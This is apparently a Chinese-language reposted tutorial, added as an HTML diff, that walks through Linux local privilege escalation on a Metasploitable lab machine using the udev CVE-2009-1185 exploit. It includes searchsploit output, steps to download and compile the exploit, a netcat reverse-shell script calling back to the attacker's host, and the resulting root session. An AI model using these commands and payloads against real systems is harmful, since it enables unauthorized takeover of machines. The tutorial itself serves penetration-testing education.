@@ -1,0 +1,121 @@
+<div class="title-image"><img src="https://pic4.zhimg.com/v2-effc0df18872479281d08a32eed4b778_b.jpg" alt=""></div><p>获取 root 权限是 Linux 漏洞利用的终极目标。跟 Windows 中的 System 用户一样，root 用户拥有对操作系统的所有管理权限。在渗透中，有时候成功利用某些漏洞只会获取一个低权限用户，所以需要使用提权技巧，提升到权限更高的 root 用户，完全控制整个系统。</p><p>一般来说，获取到低权限 shell 后我们通常会做下面几件事：<br/><br/>1. 检测操作系统的发行版本<br/>2. 查看内核版本<br/>3. 检测当前用户权限<br/>4. 列举Suid文件<br/>5. 查看已经安装的包，程序，运行的服务，过期的版本可能有漏洞</p><p>现在，我们来进行实战！</p><h2>第一步 信息收集</h2><p>我们将使用一个内核 exp 提权到 root 用户，首先我们需要搜集靶机的一一些信息。由于我们已经获取到了一个 shell，我们可以执行 <b>uname –a</b> 命令来查看内核版本，也可以使用 <b>lsb_release –a</b> 命令来查看当前系统发行版的具体版本号。</p><div class="highlight"><pre><code class="language-text">[*] Started reverse TCP handler on 172.16.1.100:4444
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (36 bytes) to 172.16.1.102
+[*] Command shell session 2 opened (172.16.1.100:4444 -&gt; 172.16.1.102:49499) at 2018-07-16 13:55:15 -0500
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+lsb_release -a
+No LSB modeuls are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 8.04
+Release:        8.04
+Codename:       hardy</code></pre></div><p>在这里，我们可以查找能利用的 exp 。刚刚执行的命令显示运行的系统是 <b>Ubuntu8.0.4</b>，内核版本是<b>2.6.24</b>。</p><p>kali 自带本地版本的 <b>Exploit-DB </b>库，这个库包含了各种 exp 和代码。</p><p>我们可以使用 <b>SearchSploit</b> 工具（这个工具非常有用）来访问这个 exp 库，只要在终端中输入 <b>searchsploit</b> 即可运行。</p><div class="highlight"><pre><code class="language-text">root@nullbyte:~# searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23 | exploits/linux_x86/local/42276.c
+Linux Kernel 2.2.25/2.4.24/2.6.2 - &#39;mremap()&#39; Local Privilege Escala | exploits/linux/local/160.c
+Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Es | exploits/linux/local/22362.c
+Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Es | exploits/linux/local/22363.c
+Linux Kernel 2.4.1 &lt; 2.4.37 / 2.6.1 &lt; 2.6.32-rc5 - &#39;pipe.c&#39; Local Pr | exploits/linux/local/9844.py
+Linux Kernel 2.4.32/2.6.0 - &#39;do_mremap()&#39; Bound Checking Privilege E | exploits/linux/local/145.c
+Linux Kernel 2.4.30/2.6.11.5 - Bluetooth &#39;bluez_sock_create&#39; Local P | exploits/linux/local/25289.c
+Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - &#39;Sendpage&#39; Local  | exploits/linux/local/19933.rb
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / REHL 4.8/5.3 / SuSE 10 SP | exploits/linux/local/9545.c
+Linux Kernel 2.4.x/2.6.x - &#39;Bluez&#39; BlueTooth Signed Buffer Index Pri | exploits/linux/local/926.c
+Linux Kernel 2.4.x/2.6.x - &#39;uselib()&#39; Local Privilege Escalation (3) | exploits/linux/local/895.c
+Linux Kernel 2.4.x/2.6.x - Bluetooth Signed Buffer Index Privilege E | exploits/linux/local/25288.c
+Linux Kernel 2.4/2.6 (Fedora 11) - &#39;sock_sendpage()&#39; Local Privilege | exploits/linux/local/9598.txt
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox | exploits/linux/local/9479.c
+Linux Kernel 2.4/2.6 (x86-64) - System Call Emulation Privilege Esca | exploits/linux_x86-64/local/4460.c
+Linux Kernel 2.4/2.6 - &#39;sock_sendpage()&#39; Local Privilege Escalation  | exploits/linux/local/9641.txt
+Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV &lt; 1.4.1 - Local | exploits/linux/local/8478.sh
+Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9/04) UDEV &lt; 1.4.1 - Local Pr | exploits/linux/local/8572.c
+Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Cor | exploits/linux_x86/local/9542.c
+Linux Kernel 2.6.0 &lt; 2.6.31 - &#39;pipe.c&#39; Local Privilege Escalation (1 | exploits/linux/local/33321.c
+Linux Kernel 2.6.10 &lt; 2.6.31.5 - &#39;pipe.c&#39; Local Privilege Escalation | exploits/linux/local/40812.c</code></pre></div><p>由于我们是要找提权 exp，所以我们搜索 <b>privilege</b>，然后使用 <b>grep</b> 命令来缩小查找范围，加上 <b>-i </b>参数忽略大小写。对于此示例，我们使用 <b>8572.c </b>这个exp，它利用了 UDEV 设备管理器中的一个漏洞，允许通过未经验证的 <b>Netlink </b>消息来执行代码。复制 exp 位置，然后使用<b> locate</b> 命令来查找完整的路径，也就是<b>/usr/share/exploitdb/exploits/linux/local/8572.c。</b></p><div class="highlight"><pre><code class="language-text">root@nullbyte:~# locate linux/local/8572.c
+/usr/share/exploitdb/exploits/linux/local/8572.c
+root@nullbyte:~#</code></pre></div><p>这个 exp 是用 C 语言写的（扩展名为.c），但是我们不用担心源代码问题，只要我们编译它就可以运行。</p><p>现在我们查看该文件，并且查看关于 exp 的详细信息，还有开发者的注释。</p><div class="highlight"><pre><code class="language-text">* cve-2009-1185.c
+*
+* udev &lt; 1141 Local Privilege Escalation Exploit
+* Jon Oberheide &lt;jon@oberheide.org&gt;
+* http://jon.oberheide.org
+*
+* Information:
+*
+*   http://cvemitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
+*
+*   udev before 1.4.1 does not verify whether a NETLINK message originates
+*   from kernel space, which allows local users to gain privileges by sending
+*   a NETLINK message from user space.
+*
+* Notes:
+*
+*   An alternative version of kcope&#39;s exploit.  This exploit leverages the
+*   95-udev-late.rules functionality that is meant to run arbitrary commands
+*   when a device is removed.  A bit cleaner and reliable as long as you
+*   distro ships that rule file.
+*
+*   Tested on Gentoo, Intrepid, and Jaunty.
+*
+* Usage:
+*
+*   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,
+*   usually is the udevd PID minus 1) as argv[1].
+*
+*   The exploit will execute /tmp/run as root so throw whatever payload you
+*   want in there.</code></pre></div><h2>第二步 把 exp 上传到靶机中</h2><p>要利用这个 exp，需要把它上传到靶机中。最简单的方法就是在本地 kali 中搭建 Apache 服务器，把 exp 放在本地服务器上，然后从靶机连接到这个服务器并下载 exp。不过，在这之前，我们要采取一些准备措施。</p><p>首先，我们要确保服务器已在 kali 上启动并运行，这个只要在终端中执行 <b>service apache2 restart</b> 命令即可。然后我们要在服务器文件目录下建立 exp 所在位置的符号链接，这样 exp 才可以下载，为此，需要执行以下命令：</p><div class="highlight"><pre><code class="language-text">ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/</code></pre></div><p>这个 exp 将在靶机的 <b>/tmp </b>目录下运行，所以，我们首先要创建一个将要执行的文件。在 kali 上，使用<b>nano /var/www/html/run </b>命令来创建一个文件并输入下面内容：</p><div class="highlight"><pre><code class="language-text">#! /bin/bash
+nc 172.16.1.100 4321 -e /bin/bash</code></pre></div><p>当这个文件执行时，它会使用 <b>Netcat </b>去连接 kali 的4321端口并生成一个 shell。执行的时候敲 Ctrl-X, Y, 和 Enter 进行保存。</p><p>现在我们准备将 exp 上传到靶机。回到我们的低权限shell，切换到 <b>/tmp </b>目录下，使用 <b>wget</b> 命令连接到kali 上运行的服务器，然后将文件上传到靶机上。</p><div class="highlight"><pre><code class="language-text">cd /tmp
+wget http://172.16.1.100/run
+--15:18:31--  http://172.16.1.100/run
+           =&gt; &#39;run&#39;
+Connecting to 172.16.1.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46
+
+    OK                                                  100%  978.43 KB/s
+
+15:18:31 (978.43 KB/s) - &#39;run&#39; saved [46/46]
+
+wget http://172.16.1.100/local/8752.c
+--15:19:24--  http://172.16.1.100/local/8572.c
+           =&gt; &#39;8572.c&#39;
+Connecting to 172.16.1.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,876 (2.8K) [text/x-csrc]
+
+    OK                                                  100%  100.46 MB/s
+
+15:19:24 (100.46 MB/s) - &#39;8572.c&#39; saved [2876/2876]</code></pre></div><h2>第三步 编译&amp;执行</h2><p>现在 exp 文件已经成功上传到靶机上了，我们下一步就是执行该 exp。由于 exp 文件是用 C 语言编写的，我们需要把它编译成可执行文件。这里我们不会深入讨论编译语言的细节，我们只需要把源码编译成可执行文件，能够运行即可，在 Linux 系统中，只要使用 <b>gcc</b> 命令即可，使用 <b>-o </b>参数来指定输出文件的名字：</p><div class="highlight"><pre><code class="language-text">gcc -o exploit 8572.c</code></pre></div><p>如果出现没有找到 <b>ld</b>（动态链接器）的情况，我们需要使用 <b>-B</b> 参数来指定链接器的位置，在本例中，位置在 <b>/usr/bin</b>，命令如下：</p><div class="highlight"><pre><code class="language-text">gcc -B /usr/bin -o exploit 8572.c</code></pre></div><p>最后，我们可以使用<b> ls</b> 命令来查看可执行文件是否已经成功编译，如图所示：</p><div class="highlight"><pre><code class="language-text">gcc -o exploit 8572.c
+collect2: cannont find &#39;ld&#39;
+
+gcc -B /usr/bin -o exploit 8572.c
+
+ls
+4674.jsvc_up
+8572.c
+exploit
+jVswA
+mhbkk
+run</code></pre></div><p>在 <b>8572.c </b>文件的文档中，它说我们要找到 <b>Netlink</b> 套接字的 <b>PID</b>，这个 <b>PID</b> 通常比 <b>UDEVD</b> 的 <b>PID</b> 小1。我们使用<b> cat /proc/net/netlink </b>命令来查看 <b>PID</b>，唯一的非0的 <b>PID</b> 就是我们想要的数字。我们可以验证这个 <b>PID</b> 是否正确，使用<b> ps aux | grep udev </b>来查看 <b>UDEVD </b>的 <b>PID</b>，它应该比刚才的数字大1，如图所示：</p><div class="highlight"><pre><code class="language-text">cat /proc/net/netlink
+sk       Eth Pid    Groups   Rmem     Wmem    Dump     Locks
+celb4800 0   0      00000000 0        0       00000000 2
+cf87fa00 4   0      00000000 0        0       00000000 2
+cd678000 7   0      00000000 0        0       00000000 2
+cdc4bc00 9   0      00000000 0        0       00000000 2
+cdc09c00 10  0      00000000 0        0       00000000 2
+ce1bc400 15  0      00000000 0        0       00000000 2
+cf8dee00 15  2459   00000000 0        0       00000000 2
+cd394800 16  0      00000000 0        0       00000000 2
+cd5f6200 18  0      00000000 0        0       00000000 2
+ps aux | grep udev
+root      2460  0.0  0.2   2216   648 ?       S&lt;s  14:42  0:01 /sbinudevd --daemon</code></pre></div><p>接下来，我们需要在 kali 中设置监听器，当脚本执行时我们就能捕获 shell。在 kali上执行 <b>nc –lvp 4321 </b>命令来监听入站连接。</p><p>现在我们的监听器是开着的，我们终于可以进行漏洞利用了。记住，要把 <b>Netlink</b> 的 <b>PID</b> 作为参数传递过去，也就是 2459。在低权限 shell 中执行下面的命令：</p><div class="highlight"><pre><code class="language-text">./exploit 2459</code></pre></div><p>片刻之后，我们的 <b>Netcat</b> 监听器就获取到了一个新的连接会话，我们输入<b> id</b> 和 <b>whoami </b>命令来查看用户信息，可以看到我们已经获取到 root 权限了。</p><div class="highlight"><pre><code class="language-text">root@nullbyte:~# nc -lvp 4321
+listening on [any] 4321 ...
+172.16.1.102: inverse host lookup failed: Unknown host
+connect to [172.16.1.100] from (UNKNOWN) [172.16.1.102] 34418
+id
+uid=0(root) gid=0(root)
+whoami
+root</code></pre></div><p>现在我们已经完全控制了整个系统，可以做任何想做的事了。</p><p>来源：<a href="https://link.zhihu.com/?target=https%3A//null-byte.wonderhowto.com/how-to/perform-local-privilege-escalation-using-linux-kernel-exploit-0186317/" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">null-byte.wonderhowto.com</span><span class="invisible">/how-to/perform-local-privilege-escalation-using-linux-kernel-exploit-0186317/</span><span class="ellipsis"></span></a></p>
